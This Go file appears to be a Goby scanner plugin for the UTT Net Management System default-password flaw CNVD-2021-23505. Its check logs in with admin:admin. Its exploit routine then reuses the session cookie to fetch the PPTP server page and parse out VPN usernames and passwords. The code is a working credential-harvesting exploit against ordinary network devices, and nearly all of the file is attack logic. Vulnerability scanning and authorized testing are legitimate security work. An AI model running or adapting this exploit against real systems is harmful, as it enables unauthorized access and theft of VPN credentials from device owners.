package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "UTT Net Management System default password CNVD-2021-23505",
    "Description": "UTT Net Management System has a default password. Attackers can log in throung admin:admin,check the system status, configurate the Net Management System,and configure VPN.",
    "Product": "UTT Net Management System",
    "Homepage": "https://www.utt.com.cn/",
    "DisclosureDate": "2021-06-09",
    "Author": "Bygosec",
    "GobyQuery": "title=\"艾泰科技\" || app=\"UTT-Device\"",
    "Level": "3",
    "Impact": "<p>Attackers can log in throung admin:admin,check the system status,configurate the Net Management System,and configure VPN.</p>",
    "Recommendation": "<p>Modify the default password of the Net Management System.</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-23505"
    ],
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "defaultaccount"
    ],
    "CVEIDs": [
        "CNVD-2021-23505"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "UTT-Device"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10199"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/action/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "username=admin&password=admin"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "Set-Cookie") {
					ss.VulURL = fmt.Sprintf("%s://admin:admin@%s/noAuth/login.html", u.Scheme(), u.HostInfo)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/action/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "username=admin&password=admin"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "Set-Cookie") {
					Cookie := strings.Split(resp.Header.Get("Set-Cookie"), "; path=/")[0]
					cfg := httpclient.NewGetRequestConfig("/common.asp?optType=PPTPSERVER")
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					cfg.Header.Store("Cookie", Cookie)
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "var srv_outboundss = new Array();") {
							if strings.Contains(strings.Split(resp.Utf8Html, "var srv_outboundss = new Array();")[1], "passwds") {
								expResult.Output = "PPTPinstNames : " + strings.Split(strings.Split(strings.Split(strings.Split(resp.Utf8Html, "var srv_outboundss = new Array();")[1], ";bindIps")[0], ";")[1], "\"")[1] + "\nPPTPTypes : " + strings.Split(strings.Split(strings.Split(strings.Split(resp.Utf8Html, "var srv_outboundss = new Array();")[1], ";bindIps")[0], ";")[2], "\"")[1] + "\nPPTPuserName : " + strings.Split(strings.Split(strings.Split(strings.Split(resp.Utf8Html, "var srv_outboundss = new Array();")[1], ";bindIps")[0], ";")[3], "\"")[1] + "\nPPTPpasswd : " + strings.Split(strings.Split(strings.Split(strings.Split(resp.Utf8Html, "var srv_outboundss = new Array();")[1], ";bindIps")[0], ";")[4], "\"")[1]
								expResult.Success = true
							} else {
								expResult.Output = "The router is not configured with VPN"
								expResult.Success = true
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
